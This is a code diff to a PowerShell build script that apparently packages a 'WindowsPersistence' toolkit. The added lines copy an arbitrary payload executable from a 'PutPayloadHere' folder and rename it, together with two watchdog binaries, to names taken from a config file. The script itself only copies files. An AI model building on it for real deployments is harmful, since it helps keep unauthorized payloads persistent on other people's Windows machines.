@@ -5,10 +5,11 @@ $projectDir = Get-Location
 $configPath = Join-Path -Path $projectDir -ChildPath "Config.cs"
 $primaryWatchdogName = (Select-String -Path $configPath -Pattern 'public static string PrimaryWatchdogName\s*{.*?} = "(.*?)";' | Select-Object -First 1).Matches.Groups[1].Value
 $secondaryWatchdogName = (Select-String -Path $configPath -Pattern 'public static string SecondaryWatchdogName\s*{.*?} = "(.*?)";' | Select-Object -First 1).Matches.Groups[1].Value
+$payloadName = (Select-String -Path $configPath -Pattern 'public static string PayloadName\s*{.*?} = "(.*?)";' | Select-Object -First 1).Matches.Groups[1].Value
 
 # Check if names were found
-if (-not $primaryWatchdogName -or -not $secondaryWatchdogName) {
-    Write-Host "Error: Could not retrieve watchdog names from Config.cs" -ForegroundColor Red
+if (-not $primaryWatchdogName -or -not $secondaryWatchdogName -or -not $payloadName) {
+    Write-Host "Error: Could not retrieve necessary names from Config.cs" -ForegroundColor Red
     exit
 }
 
@@ -29,6 +30,19 @@ $primarySource = (Get-ChildItem "..\WindowsPersistence\PrimaryWatchdog\bin\Relea
 # Copy and rename the binaries based on Config.cs values
 Copy-Item -Path $secondarySource -Destination (Join-Path -Path $outputDir -ChildPath $secondaryWatchdogName) -Force
 Copy-Item -Path $primarySource -Destination (Join-Path -Path $outputDir -ChildPath $primaryWatchdogName) -Force
+
+# Define the source path for the payload binary
+$payloadSource = "..\WindowsPersistence\PutPayloadHere\*.exe"
+
+# Check if the payload binary exists
+$payloadFile = Get-ChildItem -Path $payloadSource -File | Select-Object -First 1
+if ($payloadFile) {
+    # Copy and rename the payload binary
+    Copy-Item -Path $payloadFile.FullName -Destination (Join-Path -Path $outputDir -ChildPath $payloadName) -Force
+    Write-Host "Payload binary copied and renamed to $payloadName."
+} else {
+    Write-Host "Error: No payload binary found in /WindowsPersistence/PutPayloadHere" -ForegroundColor Red
+}
 
 # Prompt to exit
 Read-Host -Prompt "Press Enter to exit"
